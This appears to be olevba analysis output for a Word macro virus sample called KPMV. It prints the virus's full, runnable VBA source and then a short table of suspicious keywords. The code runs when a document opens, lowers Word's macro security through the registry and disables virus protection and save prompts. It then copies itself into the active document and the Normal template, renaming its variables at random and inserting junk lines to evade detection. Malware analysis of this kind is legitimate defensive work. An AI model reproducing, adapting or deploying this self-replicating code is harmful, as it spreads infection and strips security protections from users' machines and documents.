olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv-fd37f3cd76455f9a63fc9d24f32befd83b377698
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv-fd37f3cd76455f9a63fc9d24f32befd83b377698 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next
F1 = lp68h5F8L5n + G2Q8n + V0B5m + B6Q2l + M2A0p + C6J7h + N5J5r + M1E8o + K0F6x + O4
Dim kc38a3(27) As String: kc38a3(0) = "bz06h7": kc38a3(1) = "st51r8": kc38a3(2) = "br58p4": kc38a3(3) = "rr90k3": kc38a3(4) = "fj55l7": kc38a3(5) = "se51y3": kc38a3(6) = "rr90k3": kc38a3(7) = "pp64m3": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
L6 = L3U2f + G7Q2x + J6J4f + O7V6q + E5
kc38a3(8) = "lk68q4": kc38a3(9) = "hj89y6": kc38a3(10) = "uf73s1": kc38a3(11) = "ub08s0": kc38a3(12) = "kg54o0": kc38a3(13) = "ke55h2": kc38a3(14) = "wg25n6": kc38a3(15) = "fc43c3": Options.VirusProtection = False
F8 = D9C3l + J7I1k + J4F8x + R1A7z + M6E5f + A5B8w + U7
kc38a3(16) = "mk61k4": kc38a3(17) = "vx26s9": kc38a3(18) = "so93e1": kc38a3(19) = "lg08t3": kc38a3(20) = "db32u6": kc38a3(21) = "eq74m6": kc38a3(22) = "kc38a3": kc38a3(23) = "sw86d4": Options.SaveNormalPrompt = False
S6 = J6I7i + A1N2j + O8C1v + H3D4i + H3G6k + N8
kc38a3(24) = "hn48o6": kc38a3(25) = "xq52y0": kc38a3(26) = "eb22e7": kc38a3(27) = "lp68h5": Options.ConfirmConversions = False
I9 = N4P2q + R8T8s + H7N9v + O8V8t + T0S2j + G2A8p + N2J2h + B6A1n + E3I6l + T0
Set bz06h7 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
H5 = F7R2n + M1K8q + C1N2t + L4B6k + D4P1p + J4
Set st51r8 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
J3 = B6E3p + P6O8k + D7V4e + J2V8o + B8D9u + V2
Set br58p4 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
L7 = O9G6g + R3H8p + T3H7z + K4C1f + G5O7l + F7R5s + I1
fj55l7 = "private sub" & " document_open()": se51y3 = "end" & " sub"
B3 = N9H7s + E2M5n + R1
rr90k3 = br58p4.Lines(1, br58p4.CountOfLines)
R2 = K2V2u + A5B2f + E5S9z + D8G5q + Q8C2m + I5
pp64m3 = InStr(LCase(rr90k3), fj55l7)
R7 = K0O2l + G2E4x + B2N6o + N6A3g + C5B2q + R6O2e + P5P8n + Q1F0t + R7
lk68q4 = InStr(pp64m3, LCase(rr90k3), se51y3) + Len(se51y3)
L4 = M2N7e + O1G0j + E6A4h + A5F4h + O8D2y + U6J9x + O9C4e + H0B6q + S2A1i + C7
hj89y6 = Mid(rr90k3, pp64m3, lk68q4 - pp64m3)
C4 = Q7V6i + U5J6v + M0O1v + D7D0l + T2D3v + M9Q8w + H6E4i + H8
If bz06h7.CountOfLines <> 0 Then
M6 = G8L4r + S6E5u + D8M5s + I0K7i + R2N4o + C1A7h + N7
uf73s1 = bz06h7.Lines(1, bz06h7.CountOfLines)
G2 = P3V2k + N5G3i + Q6I7m + B0B4q + H7A5j + Q0L9v + J9C3e + S5B1q + N6
If InStr(uf73s1, "(27) As String") = 0 Then
R9 = E6F4j + O7M0z + P7I1e + M8Q5t + U3M7q + V2J2l + C5K3u + D5J3i + Q6E5k + M7R2q + M9U1x + K6
If InStr(LCase(uf73s1), fj55l7) <> 0 Then
B7 = T2J2x + F9L7j + H5T6y + Q4C7z + H7E7l + K7V5i + K1J1v + R6B4i + S0G7i + F4A7g + L1
ub08s0 = False
K5 = S6V2j + H1I9x + S0I7l + L2V7v + K1A5i + N6
For kg54o0 = 1 To bz06h7.CountOfLines: DoEvents
J4 = L3C3z + H6V4v + J5N6e + U1H1y + R1M0y + J3K7t + P2Q5s + K1
If ub08s0 = False Then
F7 = B5J2l + M6I6z + A4F0u + D8
If LCase(bz06h7.Lines(kg54o0, 1)) = fj55l7 Then
T7 = P1R2q + B1S4h + U3K6g + N6L8q + H3L7i + S6R0h + C7
ub08s0 = True
U2 = R8C1q + H6R2u + H4
ke55h2 = kg54o0
H5 = T0B3h + M5I4x + T5R6p + C5F3l + K6Q1t + I9B2r + F6V4l + S4S4y + C1R4r + L4G8i + E3T2n + O6
End If
P6 = B6A1l + U1O8q + D7R2w + J2R5k + H3D0e + P7V2w + R6
Else
G0 = S0T7e + O5O5g + L1N1q + B7A4o + H4G5i + P7
If LCase(bz06h7.Lines(kg54o0, 1)) = se51y3 Then
C8 = O6S6h + A4U2q + C9G1i + F5H8w + C2M2r + V7E6f + U2O2s + L1K8p + M4P2p + G2A8n + I8P4m + D6
wg25n6 = kg54o0
V3 = O3M3s + T7I8s + S3D2q + Q2E8z + R7Q0j + S4G7u + N8C7q + P7R0v + V8H2j + R8M1k + Q5O2o + U9
Exit For
V1 = Q6O4q + C3I3s + T8M1u + H6J4p + M0G3k + Q8R3x + H3V7y + K6
End If
T9 = I2K1j + H3O3l + S5U5k + N3B8r + S8F5t + H6U6w + U2K8h + E8
End If
E3 = M5L8z + O1Q8i + C5I7o + K6T6v + I8E6t + F6C8n + M9R5r + C1U8u + L4J3k + A7
Next
K2 = H5R1s + B5L0p + V9D8u + D6H1f + K1G5p + H2O9i + G8
bz06h7.DeleteLines ke55h2, wg25n6 - (ke55h2 - 1)
H3 = K1D3n + N4E4v + P4E4k + L0D9v + B6L3s + S5
End If
V1 = H8F6j + O5H6m + A3J2u + T4N7z + G4S7e + S6U7m + A6P5j + D1
Set fc43c3 = bz06h7
I7 = M0V7t + N3F1t + G1L7s + E3
bz06h7.addfromstring hj89y6: If ActiveDocument.Saved = False Then ActiveDocument.Save
L3 = T3K2v + I8K6v + T7K5j + S3F8h + Q2G5q + O3
End If
Q5 = S4I3l + N8E4h + Q7T6l + V8J7w + R7O7x + K1M4r + Q8S3q + Q1
Else
U5 = C2K8j + T8O6l + H6L0g + M9I9x + Q7S9o + H2B4p + V0M3f + O4N5o + O4Q7q + D7B0p + D4
Set fc43c3 = bz06h7
E1 = C0H1y + O8B2f + V0J1z + G4
bz06h7.addfromstring hj89y6: If ActiveDocument.Saved = False Then ActiveDocument.Save
T2 = N3K1v + U3T4o + I7K3t + L4S8r + P1H2z + M8F4t + U1
End If
O6 = J2B4z + S5L8q + K5D3v + T6
If st51r8.CountOfLines <> 0 Then
E6 = I7O5v + A7C1q + U1O7w + O1
mk61k4 = st51r8.Lines(1, st51r8.CountOfLines)
D5 = S2S2q + E7O4m + E5K8i + I9M1q + J9L0f + A1G3g + S2S9n + S4V7u + B3M3e + L8
If InStr(mk61k4, "(27) As String") = 0 Then
Q2 = R7Q7p + N8V3u + A8D4v + N2G4h + B2
If InStr(LCase(mk61k4), fj55l7) <> 0 Then
H4 = P5L7s + G4G3o + H8M7o + B6T3n + T8I6y + N7S8q + D2F5i + O2F4s + H3S4g + G2T1p + G7J2v + V9
ub08s0 = False
I7 = C8S0g + F6K2l + Q3E6j + M2J6j + F4H4e + L3N2z + F5H6g + T6F8r + F3
For kg54o0 = 1 To st51r8.CountOfLines: DoEvents
U4 = C0G9o + H3D8k + L2N8w + C6S3x + Q4H2n + J8I5x + D4I4p + D6L1i + O5
If ub08s0 = False Then
J6 = C9S2r + O7L3u + V8T2s + E1R4i + N2U2o + V2H4g + U4
If LCase(st51r8.Lines(kg54o0, 1)) = fj55l7 Then
C3 = L3G8k + J5N0i + M7P5l + T1I2p + D7H2j + M1S6v + F0J0e + O6I7q + U3
ub08s0 = True
O0 = A6M1j + K7T7z + L8P8e + I8B3t + R3T4p + R2Q8l + U5R1u + V5Q0i + M7L3k + I7C9q + I0F7x + R3
ke55h2 = kg54o0
I8 = P2Q9x + B0S5j + D5E3y + N5J4z + D7L4k + G7G2h + G2Q7v + N6I1i + O1N4i + N2C4q + U4
End If
Q6 = C7I5e + O2R3s + D2R1f + S3I2q + Q2J8y + R6V9j + S4L6u + N8I7q + A9
Else
Q5 = F3Q4s + B2V4t + Q4T1n + A3D8n + T4
If LCase(st51r8.Lines(kg54o0, 1)) = se51y3 Then
F4 = I6R5f + T7R1u + H6O4p + M9L3k + V2D6k + H2F7x + T9
wg25n6 = kg54o0
E8 = U8U2k + O4U1z + D7E3y + K1
Exit For
E6 = C0L4l + O7E5o + F4Q7v + E1K7y + T6R7r + E0
End If
I7 = I7N6g + R8D5n + P1K5l + M7I7f + D5F7t + J2E7m + S5P2y + K4G6h + O6B0k + R8
End If
T9 = L6D7i + P3H0p + A7H4z + U8O8s + G3K1p + G2H5k + J5I6t + F2E3u + B6D8j + O3L2g + S4
Next
P5 = T5F6t + E2H5w + M0J1i + R9
st51r8.DeleteLines ke55h2, wg25n6 - (ke55h2 - 1)
L7 = S1S7o + O7C0k + M3P4t + D1
End If
H7 = C6V6h + D1F0h + S7L6g + U4F3f + P4O4s + F8B2k + K3U6l + J8O0i + P7
Set fc43c3 = st51r8
I4 = I3G7x + I0S5n + E4O5j + G3G8n + L4T0y + C8
st51r8.addfromstring hj89y6: If NormalTemplate.Saved = False Then NormalTemplate.Save
G2 = G1D0g + M8J7f + D3
End If
E3 = P8U1k + J4B8n + T2V2h + C5S1z + R3E4v + J7J9v + B5U8l + Q9V1v + Q9C3w + J5
Else
H8 = A0L9h + E5P6i + Q3I6m + U9
Set fc43c3 = st51r8
R5 = G6O8w + V2A8p + A7F8u + K2S8e + T3H6l + O7
st51r8.addfromstring hj89y6: If NormalTemplate.Saved = False Then NormalTemplate.Save
S8 = O3N9z + U6F6h + L7I9k + T1T4w + M0L7f + Q2F2h + K2V1f + H6O8k + M3R2r + R5
End If
F1 = Q8D0u + S8Q8h + S7N3z + V2O5l + B2O4w + U7N0l + K3V4i + Q0G5y + P5P7v + B2R6y + I0T2k + C7
If fc43c3 <> "" Then
N3 = M5E3j + D8G3r + G8B1o + G2L6g + S2H3y + U5M6y + T3
Dim vx26s9 As Long, so93e1 As Long, lg08t3 As Long, db32u6 As Long
E8 = P9M8w + E4S7e + P8F4s + F3
For eq74m6 = 0 To UBound(kc38a3): DoEvents
J3 = D4A6z + B3B3m + S4K1j + D5D2i + U8V2e + B7O4i + G9E6t + C8J5t + R1H3n + B9N1n + B6L8z + F7
Randomize: sw86d4 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents
V8 = E8J5i + O6G8y + T0D7u + B8O7k + O3S2l + G1H1x + V5I4k + V5M6m + K8S8l + F6V2t + J1D8u + S9
vx26s9 = 1: so93e1 = 1
K2 = G1E8v + A1B3g + F1
With fc43c3
H4 = R2N3f + F6F3k + H4M7i + L1B2q + I7V4k + P1O1o + F2R4q + O5G8h + T2
Do While .Find(kc38a3(eq74m6), vx26s9, so93e1, lg08t3, db32u6, True)
Q6 = K6O6o + E7I5m + S6S0h + G7E6x + N3D0l + F8H2r + N4D3o + N2A7j + B9
hn48o6 = .Lines(lg08t3, 1)
L2 = S6A9g + J7S2i + F7I8p + E1L6w + K0C2f + A8
xq52y0 = Mid(hn48o6, 1, so93e1 - 1) & sw86d4 & Mid(hn48o6, db32u6)
D8 = D4G6q + A5K2w + J5P3x + V8R3j + M1
.replaceline lg08t3, xq52y0: DoEvents
P4 = C2A6t + P1S3p + Q5B6p + J3I3o + F5U5e + A4H7r + M8Q4k + B8Q3t + Q9H3h + O8I0q + V1
vx26s9 = lg08t3
C9 = P1L8m + L5H8i + N3V1m + P6
lg08t3 = .CountOfLines: so93e1 = 1
B8 = D8M0v + R1K7q + B9Q5p + R2K1s + J3J2i + U4I6x + O6J3f + T0G2w + R2
Loop
V8 = P3V7n + G1K6e + A4L8n + P1L7f + K7V3o + F5C7v + J1G3x + V4
End With
M1 = G0H4y + L2F6o + U3I3u + F3R6m + P7I6s + S4Q1q + Q7B2o + T8D6r + E2S3v + K8R4p + T2G8f + T2
Next
G6 = V7S9w + J4I5k + H7A3p + R8H8j + S9D0k + P0L4z + B4H6v + C3E1r + F6F2e + E2
With fc43c3
J5 = T8V4q + P8M1w + P1P0h + U1F5n + A3E1h + T1E0u + A5M8n + R9
For eb22e7 = 2 To (.CountOfLines - 1) Step 2: DoEvents
A4 = V7T9w + D7O6t + C2C3k + J7Q5t + K1A9t + J3K8f + F5A2r + J3
For lp68h5 = 1 To (Int(Rnd * 10) + 2): DoEvents
V8 = M8S1w + B8S9k + Q9J9u + O8K6h + P3B7n + P1M4z + L4J5v + N3B7z + C9R2x + A2
Randomize: sw86d4 = sw86d4 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents
N2 = N1U8s + T9E6r + U2
Next lp68h5
T8 = G3T3k + R4S8z + E2Q2t + J6N1p + F4
Randomize: .replaceline eb22e7, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & sw86d4 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents
A6 = F8G5g + C1V7g + S4V0p + M1V9h + A4F1g + B5M8x + M2
sw86d4 = "": DoEvents
N9 = K8D7m + B5O0t + A2I9v + P7Q9p + A7D3h + E8M8z + B7
Next eb22e7
B2 = L2J7j + I9H0z + U6E9q + F3D0k + O6N4w + G6F8f + K7V2h + E8Q1f + I9
End With
K6 = G9L2q + M4L6f + K4T1u + S9O2q + S7L7m + V2M8v + R7I5w + O3H1l + E9P4i + A6
End If
C6 = J2J7v + R7M7y + N3
'KPMV Word 2000 Macro Virus - By [K] - Virii Argentina - http://www.virii.com.ar
F0 = F1A2z + I6A9q + F4G2l + C9U6v + B3H2m + O3D8j + P6J2j + J4Q8h + L1J5g + S6
'February 2001 - Buenos Aires - Argentina
K7 = R4F3m + A0C8n + V5T2k + J3V7p + M8
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.virii.com|URL                                          |
|          |.ar                 |                                             |
+----------+--------------------+---------------------------------------------+

